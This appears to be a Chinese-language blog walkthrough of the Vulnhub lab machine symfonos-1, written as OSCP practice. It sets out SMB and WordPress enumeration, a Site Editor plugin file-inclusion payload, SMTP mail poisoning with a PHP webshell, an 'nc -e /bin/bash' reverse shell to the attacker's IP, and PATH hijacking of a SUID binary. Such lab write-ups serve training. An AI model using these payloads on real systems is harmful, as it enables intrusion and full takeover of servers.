@@ -1,0 +1,348 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>OSCP-Intermediate-symfonos_1 | Hustler&#39;s Blog</title>
+  <meta name="author" content="Hustler">
+  
+  <meta name="description" content="Everybody needs love,but hacker dont">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="OSCP-Intermediate-symfonos_1"/>
+  <meta property="og:site_name" content="Hustler&#39;s Blog"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+    <link rel="alternative" href="/atom.xml" title="Hustler&#39;s Blog" type="application/atom+xml">
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-70812759-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-70812759-1');
+</script>
+
+
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">Hustler&#39;s Blog</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class=""></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/categories" title="All the categories.">
+			  <i class=""></i>Categories
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tags" title="All the tags.">
+			  <i class=""></i>Tags
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/about" title="About me.">
+			  <i class=""></i>About
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/archives" title="Subscribe me.">
+			  <i class=""></i>RSS
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> OSCP-Intermediate-symfonos_1</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <h1 id="symfonos-1"><a href="#symfonos-1" class="headerlink" title="symfonos-1"></a>symfonos-1</h1><h2 id="来源：Vulnhub"><a href="#来源：Vulnhub" class="headerlink" title="来源：Vulnhub"></a>来源：Vulnhub</h2><h3 id="难度：Intermediate"><a href="#难度：Intermediate" class="headerlink" title="难度：Intermediate"></a>难度：Intermediate</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-O</span> <span class="token parameter variable">-A</span> <span class="token parameter variable">-Pn</span> <span class="token parameter variable">-sV</span> <span class="token parameter variable">-sS</span> -p- <span class="token number">192.168</span>.36.0/24 <span class="token parameter variable">-vv</span> <span class="token parameter variable">-exclude</span> <span class="token number">192.168</span>.36.1
+
+<span class="token comment"># 对除了192.168.36.1之外的目标进行全端口SYN半开扫描，探测系统和服务</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p>发现目标<code>192.168.36.129</code>开启了<code>80,445,22,25</code>等端口，对应web，smb，ssh，smtp等服务<br>访问80端口，发现有网页，尝试爆破目录无果<br>使用命令</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">smbclient <span class="token punctuation">\</span><span class="token punctuation">\</span><span class="token punctuation">\</span><span class="token punctuation">\</span><span class="token number">192.168</span>.36.129<span class="token punctuation">\</span><span class="token punctuation">\</span>anonymous<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>尝试匿名登录smb服务（空密码）<br>成功登录后dir查看目录发现有一个attention.txt文件：<br><img src="/images/OSCPsymfonos1/1.JPG"></p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">get attention.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>将文件下载到当前目录，使用cat查看内容：<br><img src="/images/OSCPsymfonos1/2.JPG"><br>发现了三个可能的密码：</p>
+<pre class="line-numbers language-none"><code class="language-none">epidioko
+qwerty
+baseball<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p>使用命令：</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">enum4linux <span class="token number">192.168</span>.36.129<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>发现了一些用户名和工作组信息：<br><img src="/images/OSCPsymfonos1/3.JPG"><br>发现有一个用户helios，尝试利用刚才发现的三个密码登录smb，使用命令：</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">smbclient <span class="token punctuation">\</span><span class="token punctuation">\</span><span class="token punctuation">\</span><span class="token punctuation">\</span><span class="token number">192.168</span>.36.129<span class="token punctuation">\</span><span class="token punctuation">\</span>helios <span class="token parameter variable">-U</span> helios
+
+<span class="token comment"># \\\\ipaddress\\username -U username    ?</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p>成功登录后dir查看目录发现有<code>todo.txt</code>和<code>research.txt</code>两个文件，查看todo.txt发现<code>work on /h3l105</code><br><img src="/images/OSCPsymfonos1/4.JPG"><br>猜测这是一个目录路径，结合之前发现的80端口，直接拼接浏览器访问，发现是wordpress博客，直接访问<code>wp-admin</code>，尝试弱口令失败，使用wpscan，发现uploads目录：</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">wpscan <span class="token parameter variable">--url</span> http://192.168.36.129/h3l105/ <span class="token parameter variable">--enumerate</span> u
+<span class="token comment"># 发现可能的用户名</span>
+
+wpscan <span class="token parameter variable">--url</span> http://192.168.36.129/h3l105/ <span class="token parameter variable">--enumerate</span> ap
+<span class="token comment"># 发现可能的插件</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="/images/OSCPsymfonos1/5.JPG"><br>访问此目录发现siteeditor插件：<br><img src="/images/OSCPsymfonos1/6.JPG"><br>使用searchsploit搜索：</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">searchsploit site editor
+
+<span class="token comment"># 搜索“site editor”</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p>发现一个wordpress插件有本地文件包含漏洞：<br><img src="/images/OSCPsymfonos1/7.JPG"><br>下载相关利用文档：</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">searchsploit <span class="token parameter variable">-m</span> <span class="token number">44340</span>.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>查看保存到本地的44340.txt文件：<br><img src="/images/OSCPsymfonos1/8.JPG"><br>漏洞存在于<code>ajax_shortcode_pattern.php</code>这个php文件中的<code>ajax_path</code>参数中，此用户可控，且没有进行任何的过滤，结合<code>require_once</code>函数，最终导致了本地文件包含漏洞，payload如下：</p>
+<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;&lt;host&gt;&#x2F;wp-content&#x2F;plugins&#x2F;site-editor&#x2F;editor&#x2F;extensions&#x2F;pagebuilder&#x2F;includes&#x2F;ajax_shortcode_pattern.php?ajax_path&#x3D;&#x2F;etc&#x2F;passwd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>此时结合剩下的445，22，25端口的开放情况，猜测是要想办法往目标服务器里传包含webshell的文件（不一定是php，因为文件包含漏洞可以直接执行文件里的内容而不管文件类型），然后用这个漏洞去包含<br>我们可以尝试telnet到smtp服务（25端口，邮件服务）并尝试利用此服务来上传文件，一般来说，smtp服务收到的邮件会放在<code>/var/mail/存在的用户名</code>中，我们先尝试telnet到smtp服务，并上传文件：<br><img src="/images/OSCPsymfonos1/9.JPG"></p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 请按照以下步骤来</span>
+
+mail from: anyname@anydomain
+<span class="token comment"># 设置来源 随便写</span>
+
+rcpt to: helios@symfonos.localdomain
+<span class="token comment"># 设置收件信息 helios处填目标主机的用户名，@后面的必须是目标的hostname，hostname可由nmap得，如图：</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="/images/OSCPsymfonos1/10.JPG"></p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">data <span class="token comment"># 设置文件内容</span>
+
+<span class="token operator">&lt;</span>?php <span class="token builtin class-name">echo</span> shell_exec<span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'passwd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> ?<span class="token operator">></span> <span class="token comment"># 输入webshell</span>
+
+<span class="token builtin class-name">.</span> <span class="token comment"># 回车后点号结束正文编辑</span>
+
+<span class="token comment"># 显示ok queued...... 即上传成功</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>此时使用payload：</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://<span class="token operator">&lt;</span>host<span class="token operator">></span>/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path<span class="token operator">=</span>/var/mail/helios<span class="token operator">&amp;</span><span class="token assign-left variable">passwd</span><span class="token operator">=</span>nc <span class="token parameter variable">-e</span> /bin/bash <span class="token number">192.168</span>.36.132 <span class="token number">6666</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>即可使用nc反弹一个shell，注意因为是文件包含漏洞，我们上传的webshell并不能连接，只能做到一个rce的效果，所以这里要反弹shell<br>我们使用nc得到一个没有tty的shell，使用命令<code>which python</code>可以检查是否有安装python，利用python可以获得一个有tty的反弹shell，我选择了上传socat，利用socat回连一个有tty的shell，然后上传各种提权脚本，一通跑，然后在linpeas的结果中找到一个可疑文件：<br><img src="/images/OSCPsymfonos1/11.JPG"><br>我们也可以用以下命令来查找：</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> / <span class="token parameter variable">-perm</span> <span class="token parameter variable">-u</span><span class="token operator">=</span>s <span class="token parameter variable">-type</span> f <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null
+
+<span class="token comment"># suid_lookup</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p>将这个可疑文件放入ida分析，或者直接使用<code>strings</code>命令分析其字符串：<br><img src="/images/OSCPsymfonos1/12.JPG"><br>发现其调用了curl，就是说，这个程序会以root权限执行curl，又因为它使用了相对路径而不是绝对路径，所以我们可以通过修改环境变量，让他执行我们自己写的恶意curl，使用以下命令创建恶意文件，其他名称的文件同理：</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> /tmp  <span class="token comment"># 去到任何人可读可写的/tmp目录 实战中可根据环境不同找到其他可读可写目录</span>
+<span class="token builtin class-name">echo</span> <span class="token string">"/bin/sh"</span> <span class="token operator">></span> <span class="token function">curl</span>  <span class="token comment"># 将需要执行的恶意代码写入我们的恶意文件中，这里需要一个root的shell，所以让其执行bin/sh（我们可以尝试bash和sh，看哪个可以有效获取root权限），同理，若需要修改其他程序，curl也可以换成其他名字</span>
+<span class="token function">chmod</span> <span class="token number">777</span> <span class="token function">curl</span>  <span class="token comment"># 添加执行权限</span>
+<span class="token builtin class-name">echo</span> <span class="token environment constant">$PATH</span>  <span class="token comment"># 输出现在（更改前）的环境变量</span>
+<span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">PATH</span></span><span class="token operator">=</span>/tmp:<span class="token environment constant">$PATH</span>  <span class="token comment"># 将存有恶意文件的目录写进环境变量</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>修改后运行可疑文件，即可获得root权限<br><img src="/images/OSCPsymfonos1/13.JPG"></p>
+
+	  <div class="article-footer-copyright">
+
+    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
+</div>
+
+	</div>
+
+	
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+    
+    <a href="/2024/12/19/OSCP-symfonos2/" type="button" class="btn btn-default"><i
+                class="fa fa-arrow-circle-o-left"></i> Prev</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2024/09/05/OSCPBTRsys/" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+-->
+	
+	
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2024-12-16 
+	</div>
+	
+
+	<!-- categories -->
+    
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
+    <ul id="categorys" class="tag_box list-unstyled collapse in">
+          
+  <li>
+    <li><a href="/categories/靶场练习/">靶场练习<span>5</span></a></li> <li><a href="/categories/靶场练习/OSCP/">OSCP<span>5</span></a></li> <li><a href="/categories/靶场练习/OSCP/Vulnhub/">Vulnhub<span>5</span></a></li> <li><a href="/categories/靶场练习/OSCP/Vulnhub/Intermediate/">Intermediate<span>3</span></a></li>
+
+<div class="widget tag">
+  <h3 class="title">All Categories</h3>
+     <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/SRC%E6%8C%96%E6%8E%98/">SRC挖掘</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E4%B8%AA%E4%BA%BA%E9%A1%B9%E7%9B%AE/">个人项目</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%AB%9E%E8%B5%9B/">竞赛</a><span class="category-list-count">22</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%AB%9E%E8%B5%9B/AWD/">AWD</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%AB%9E%E8%B5%9B/CTF/">CTF</a><span class="category-list-count">21</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%AB%9E%E8%B5%9B/CTF/Crypto/">Crypto</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%AB%9E%E8%B5%9B/CTF/Misc/">Misc</a><span class="category-list-count">5</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%AB%9E%E8%B5%9B/CTF/PWN/">PWN</a><span class="category-list-count">5</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%AB%9E%E8%B5%9B/CTF/Reverse/">Reverse</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%AB%9E%E8%B5%9B/CTF/Web/">Web</a><span class="category-list-count">9</span></li></ul></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%80%9F%E6%9F%A5/">速查</a><span class="category-list-count">4</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%80%9F%E6%9F%A5/CTF/">CTF</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%80%9F%E6%9F%A5/%E5%8D%9A%E5%AE%A2/">博客</a><span class="category-list-count">2</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/">靶场练习</a><span class="category-list-count">5</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/OSCP/">OSCP</a><span class="category-list-count">5</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/OSCP/Vulnhub/">Vulnhub</a><span class="category-list-count">5</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/OSCP/Vulnhub/Easy/">Easy</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/OSCP/Vulnhub/Intermediate/">Intermediate</a><span class="category-list-count">3</span></li></ul></li></ul></li></ul></li></ul> 
+</div>
+ 
+  </li>
+
+    </ul>
+	</div>
+	
+
+	<!-- tags -->
+	
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
+    <ul id="tags" class="tag_box list-unstyled collapse in">	  
+	    
+  <li><a href="/tags/OSCP/">OSCP<span>5</span></a></li> <li><a href="/tags/靶场练习/">靶场练习<span>5</span></a></li> <li><a href="/tags/Vulnhub/">Vulnhub<span>5</span></a></li>
+    </ul>
+	</div>
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+		
+
+	</div>
+	
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2025 Hustler's Blog
+  
+      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+</body>
+   </html>
